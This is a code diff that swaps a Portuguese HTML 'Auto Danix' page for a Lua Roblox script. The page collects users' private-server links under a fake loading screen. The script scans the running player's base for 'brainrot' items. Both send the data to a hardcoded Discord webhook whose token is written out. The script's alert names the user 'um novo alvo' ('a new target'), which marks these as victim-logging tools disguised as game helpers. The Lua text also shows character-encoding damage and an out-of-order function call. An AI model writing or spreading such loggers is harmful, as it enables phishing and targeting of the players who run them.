@@ -1,421 +1,268 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Danix</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a2a3a, #0d1b2a);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .header {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .logo-icon {
-            font-size: 2rem;
-        }
-        
-        .logo-text {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #4CAF50;
-        }
-        
-        .tabs {
-            display: flex;
-            gap: 5px;
-        }
-        
-        .tab {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 8px 20px;
-            border-radius: 5px 5px 0 0;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .tab.active {
-            background: rgba(76, 175, 80, 0.3);
-            border-bottom: 2px solid #4CAF50;
-        }
-        
-        .container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-        }
-        
-        .main-content {
-            width: 100%;
-            max-width: 600px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 40px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            text-align: center;
-        }
-        
-        .title {
-            margin-bottom: 30px;
-        }
-        
-        .title h1 {
-            font-size: 3rem;
-            margin-bottom: 10px;
-            color: #4CAF50;
-        }
-        
-        .title p {
-            font-size: 1.5rem;
-            opacity: 0.9;
-        }
-        
-        .input-group {
-            margin-bottom: 30px;
-            text-align: left;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 15px;
-            font-size: 1.3rem;
-            font-weight: 500;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 18px 20px;
-            border-radius: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-size: 1.2rem;
-            transition: all 0.3s ease;
-        }
-        
-        .input-group input:focus {
-            outline: none;
-            border-color: #4CAF50;
-            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
-        }
-        
-        .btn {
-            width: 100%;
-            padding: 18px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.3rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        
-        .btn:hover {
-            background: #45a049;
-            transform: translateY(-3px);
-            box-shadow: 0 7px 20px rgba(0, 0, 0, 0.3);
-        }
-        
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #1a2a3a, #0d1b2a);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.5s ease;
-        }
-        
-        .loading-screen.active {
-            opacity: 1;
-            visibility: visible;
-        }
-        
-        .loading-logo {
-            width: 150px;
-            height: 150px;
-            margin-bottom: 40px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #4CAF50, #2196F3);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 4rem;
-            animation: pulse 2s infinite;
-        }
-        
-        .loading-text {
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            color: #4CAF50;
-            font-weight: 700;
-        }
-        
-        .loading-bar {
-            width: 400px;
-            height: 10px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 5px;
-            overflow: hidden;
-            margin-bottom: 30px;
-        }
-        
-        .loading-progress {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #4CAF50, #2196F3);
-            animation: loading 2s infinite;
-        }
-        
-        .loading-info {
-            text-align: center;
-            font-size: 1.2rem;
-            opacity: 0.7;
-            max-width: 80%;
-            line-height: 1.5;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        
-        @keyframes loading {
-            0% { width: 0%; }
-            50% { width: 70%; }
-            100% { width: 100%; }
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.9rem;
-            opacity: 0.7;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #4CAF50;
-            color: white;
-            padding: 15px 25px;
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            z-index: 1001;
-            opacity: 0;
-            transform: translateX(100px);
-            transition: all 0.3s ease;
-        }
-        
-        .notification.show {
-            opacity: 1;
-            transform: translateX(0);
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <div class="logo">
-            <div class="logo-icon">🎄</div>
-            <div class="logo-text">Auto Danix</div>
-        </div>
-        <div class="tabs">
-            <div class="tab active">Início</div>
-            <div class="tab">Servidores</div>
-            <div class="tab">Configurações</div>
-            <div class="tab">Ajuda</div>
-        </div>
-    </div>
-    
-    <div class="container">
-        <div class="main-content" id="mainScreen">
-            <div class="title">
-                <h1>🎄 Auto Danix</h1>
-                <p>Coloque o link do seu servidor privado aqui</p>
-            </div>
-            
-            <div class="input-group">
-                <label for="serverLink">Link do Roblox</label>
-                <input type="text" id="serverLink" placeholder="https://www.roblox.com/games/...">
-            </div>
-            
-            <button class="btn" id="confirmBtn">CONFIRMAR</button>
-        </div>
-    </div>
-    
-    <div class="footer">
-        Auto Danix &copy; 2023 - Todos os direitos reservados
-    </div>
-    
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loading-logo">D</div>
-        <div class="loading-text">MÉTODO DANIX</div>
-        <div class="loading-bar">
-            <div class="loading-progress"></div>
-        </div>
-        <div class="loading-info">Carregando informações do servidor...</div>
-    </div>
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
 
-    <div class="notification" id="notification">
-        Dados enviados para o webhook com sucesso!
-    </div>
+-- Webhook URL
+local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"
 
-    <script>
-        // Webhook do Discord fornecido
-        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173";
+-- Lista de Brainrots vÃ¡lidos
+local VALID_BRAINROTS = {
+    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
+    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
+    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
+    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
+    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
+    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
+    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
+    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
+    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
+    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
+    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
+    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
+    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
+    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
+    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
+    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
+    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
+    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
+    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
+    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
+    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
+    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
+    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
+    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti IÃ¬ IÃ¬ Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
+    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob TobÃ¬ TobÃ¬", 
+    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
+    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
+    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
+    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
+    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
+    "Brr Brr PatapÃ n", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
+    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
+    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
+    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
+    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
+    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
+    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
+    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
+    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
+    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
+    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
+}
 
-        document.getElementById('confirmBtn').addEventListener('click', function() {
-            const serverLink = document.getElementById('serverLink').value;
-            
-            if (!serverLink) {
-                alert('Por favor, insira o link do servidor privado do Roblox.');
-                return;
-            }
-            
-            // Mostrar tela de carregamento
-            document.getElementById('loadingScreen').classList.add('active');
-            document.getElementById('mainScreen').classList.add('hidden');
-            
-            // Simular coleta de informações
-            setTimeout(() => {
-                // Coletar informações fictícias
-                const playerName = "Jogador_" + Math.floor(Math.random() * 1000);
-                const brainrotCount = Math.floor(Math.random() * 50) + 1;
-                const playerCount = Math.floor(Math.random() * 100) + 10;
-                
-                // Enviar para webhook
-                sendToWebhook(playerName, brainrotCount, playerCount, serverLink);
-            }, 2000);
-        });
-        
-        // Adicionar funcionalidade às abas
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                this.classList.add('active');
-            });
-        });
-        
-        function showNotification(message) {
-            const notification = document.getElementById('notification');
-            notification.textContent = message;
-            notification.classList.add('show');
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
-        }
-        
-        function sendToWebhook(playerName, brainrotCount, playerCount, serverLink) {
-            const data = {
-                content: "🚨 **NOVO ACESSO DETECTADO - AUTO DANIX** 🚨",
-                embeds: [
-                    {
-                        title: "🎄 Auto Danix - Informações Coletadas",
-                        color: 3066993,
-                        fields: [
-                            {
-                                name: "👤 Nome do Jogador",
-                                value: playerName,
-                                inline: true
-                            },
-                            {
-                                name: "🧠 Brainrot na Base",
-                                value: brainrotCount.toString(),
-                                inline: true
-                            },
-                            {
-                                name: "👥 Pessoas no Servidor",
-                                value: playerCount.toString(),
-                                inline: true
-                            },
-                            {
-                                name: "🔗 Link do Servidor",
-                                value: serverLink
-                            },
-                            {
-                                name: "⏰ Horário",
-                                value: new Date().toLocaleString('pt-BR')
-                            }
-                        ],
-                        timestamp: new Date().toISOString(),
-                        footer: {
-                            text: "Auto Danix System"
-                        }
-                    }
-                ]
-            };
-            
-            // Enviar para o webhook do Discord
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
+-- IDs para procurar
+local TARGET_IDS = {
+    "28e4ec29-d005-4636-82af-339f37dcef",
+    "960ab477-3f31-4327-845e-6a77ebb5fa6",
+    "2206090e-719d-4034-8720-700c9fb2h458",
+    "dd76771-ce3c-4108-adae-5a488b2958be",
+    "44392a62-6012-413d-9619-dab73c00539f",
+    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
+    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
+    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
+}
+
+-- FunÃ§Ã£o para verificar se um nome Ã© um brainrot vÃ¡lido
+local function isValidBrainrot(name)
+    for _, brainrot in ipairs(VALID_BRAINROTS) do
+        if name == brainrot then
+            return true
+        end
+    end
+    return false
+end
+
+-- FunÃ§Ã£o para procurar brainrots na workspace
+local function findBrainrots()
+    local foundBrainrots = {}
+    
+    -- Procurar na pasta Plots
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    if plotsFolder then
+        for _, plot in ipairs(plotsFolder:GetDescendants()) do
+            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
+                table.insert(foundBrainrots, plot.Name)
+            end
+        end
+    end
+    
+    -- Procurar por IDs especÃ­ficos
+    for _, id in ipairs(TARGET_IDS) do
+        local model = Workspace:FindFirstChild(id)
+        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
+            table.insert(foundBrainrots, model.Name)
+        end
+    end
+    
+    -- Remover duplicatas
+    local uniqueBrainrots = {}
+    for _, brainrot in ipairs(foundBrainrots) do
+        local alreadyExists = false
+        for _, existing in ipairs(uniqueBrainrots) do
+            if existing == brainrot then
+                alreadyExists = true
+                break
+            end
+        end
+        if not alreadyExists then
+            table.insert(uniqueBrainrots, brainrot)
+        end
+    end
+    
+    return uniqueBrainrots
+end
+
+-- Nova funÃ§Ã£o para enviar webhook usando RequestAsync (mais seguro)
+local function sendWebhook(brainrots)
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    local player = Players.LocalPlayer
+    local playerName = player.Name
+    local playerCount = #Players:GetPlayers()
+    
+    -- Criar lista de brainrots formatada
+    local brainrotsList = ""
+    if #brainrots > 0 then
+        for i, brainrot in ipairs(brainrots) do
+            brainrotsList = brainrotsList .. "â€¢ " .. brainrot .. "\n"
+            if i >= 40 then -- Limite de 40 brainrots
+                brainrotsList = brainrotsList .. "... e mais\n"
+                break
+            end
+        end
+    else
+        brainrotsList = "Nenhum brainrot detectado"
+    end
+    
+    -- Criar payload do webhook
+    local payload = {
+        content = "@everyone @here, um novo alvo usou o script @everyone @here",
+        embeds = {{
+            title = "ðŸ§  DETECÃ‡ÃƒO DE BRAINROTS ðŸ§ ",
+            color = 0xFF0000,
+            fields = {
+                {
+                    name = "âŒ› Data e hora de execuÃ§Ã£o:",
+                    value = currentTime,
+                    inline = false
                 },
-                body: JSON.stringify(data),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Dados enviados com sucesso para o webhook');
-                    showNotification('✅ Dados enviados para o Discord!');
-                } else {
-                    console.error('Erro ao enviar dados:', response.status);
-                    showNotification('❌ Erro ao enviar dados');
+                {
+                    name = "ðŸ‘¤ Nome de usuÃ¡rio:",
+                    value = playerName,
+                    inline = true
+                },
+                {
+                    name = "ðŸ‘¥ Pessoas no servidor:",
+                    value = tostring(playerCount),
+                    inline = true
+                },
+                {
+                    name = "ðŸŽ’ðŸ§  BRAINROTS DETECTADOS:",
+                    value = brainrotsList,
+                    inline = false
                 }
-            })
-            .catch(error => {
-                console.error('Erro ao enviar dados:', error);
-                showNotification('❌ Erro de conexão');
-            });
-            
-            // A tela de carregamento permanece ativa infinitamente conforme solicitado
-        }
-    </script>
-</body>
-</html>
+            },
+            author = {
+                name = "NotificadorðŸ§  || By: Project BRANZz || âŒ›: " .. currentTime
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    -- MÃ©todo alternativo usando RequestAsync
+    local success, result = pcall(function()
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if success then
+        print("âœ… Webhook enviado com sucesso!")
+        print("ðŸ“Š Brainrots detectados: " .. table.concat(brainrots, ", "))
+    else
+        warn("âŒ Erro ao enviar webhook: " .. tostring(result))
+        -- Tentar mÃ©todo alternativo com game:HttpGet
+        alternativeSendWebhook(payload, brainrots)
+    end
+end
+
+-- MÃ©todo alternativo caso o primeiro falhe
+local function alternativeSendWebhook(payload, brainrots)
+    local encodedPayload = HttpService:JSONEncode(payload)
+    
+    -- Usar game:HttpGet como alternativa (Ã s vezes funciona melhor)
+    local success, result = pcall(function()
+        local response = game:HttpGet(
+            WEBHOOK_URL .. "?wait=true", 
+            {
+                method = "POST",
+                headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                body = encodedPayload
+            }
+        )
+        return response
+    end)
+    
+    if success then
+        print("âœ… Webhook enviado (mÃ©todo alternativo)!")
+        print("ðŸ“Š Brainrots detectados: " .. table.concat(brainrots, ", "))
+    else
+        warn("âŒ Falha em todos os mÃ©todos de envio: " .. tostring(result))
+        print("ðŸ“Š Brainrots detectados (nÃ£o enviados): " .. table.concat(brainrots, ", "))
+    end
+end
+
+-- FunÃ§Ã£o para verificar se HttpService estÃ¡ habilitado
+local function checkHttpService()
+    if not HttpService then
+        warn("âŒ HttpService nÃ£o disponÃ­vel")
+        return false
+    end
+    
+    local success = pcall(function()
+        HttpService:GetAsync("https://httpbin.org/get")
+    end)
+    
+    if not success then
+        warn("âš ï¸ HttpService pode estar desabilitado")
+    end
+    
+    return success
+end
+
+-- FunÃ§Ã£o principal
+local function main()
+    -- Esperar um pouco para garantir que tudo carregou
+    wait(2)
+    
+    print("ðŸ” Iniciando busca por brainrots...")
+    
+    -- Verificar se HttpService funciona
+    if not checkHttpService() then
+        warn("âš ï¸ PossÃ­veis problemas com HttpService")
+    end
+    
+    local detectedBrainrots = findBrainrots()
+    
+    if #detectedBrainrots > 0 then
+        print("ðŸ§  Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
+    else
+        print("âŒ Nenhum brainrot detectado")
+    end
+    
+    -- Enviar webhook com os resultados
+    print("ðŸ“¤ Enviando para webhook...")
+    sendWebhook(detectedBrainrots)
+end
+
+-- Executar o script com tratamento de erro
+local success, err = pcall(main)
+if not success then
+    warn("âŒ Erro ao executar script: " .. tostring(err))
+end
